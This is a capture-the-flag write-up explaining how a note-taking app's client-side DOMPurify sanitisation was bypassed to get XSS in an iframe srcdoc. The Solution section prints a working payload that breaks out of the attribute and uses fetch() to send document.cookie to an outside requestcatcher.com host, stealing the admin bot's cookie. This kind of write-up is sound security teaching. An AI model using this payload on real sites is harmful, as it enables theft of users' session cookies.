# Refined Notes

## Challenge Description
All my friends warned me about xss, so I created this note taking app that only accepts "refined" Notes.

## First Look
This challenge did not come with any source code. The code provided here was retrieved from viewing source in the browser. The challenge consists of the note taking app as well as an admin bot which allows you to specify a UUID of a note for the admin bot to browse to. On first glance, it appears that whatever you put into the [textarea](index.html#L14) is reflected into the [srcdoc](https://www.w3schools.com/tags/att_iframe_srcdoc.asp) of the iframe, which basically is just the HTML that is rendered within the iframe.

## Injection
Let us try injecting some HTML. I input `<h1>hello</h1>` and sure enough, hello was a header. However, I tried `<script>alert('hello')</script>` and the script tags were stripped out. Looks like they are doing some kind of XSS sanitization. Upon looking at the source document, I noticed a reference to [index.js](index.js). The script sanitizes the input field with [DOMPurify](https://github.com/cure53/DOMPurify) before sending a POST request to '/'. 

## Solution
Since the sanitization happens on the front end, we can bypass by making the POST request directly. The payload I used was
```
<h1>hello</h1>" onload="fetch('https://refinednotes2wsx.requestcatcher.com/?cookie='+document.cookie);
```
which becomes reflected as
```
<iframe id="noteframe" class=" bg-white w-full px-3 py-2 border rounded-md h-60" srcdoc="<h1>hello</h1>" onload="fetch('https://refinednotes2wsx.requestcatcher.com/?cookie='+document.cookie);"></iframe>
```

## Flag
I had the admin bot surf to the uuid I received in the response, and got a request with the flag.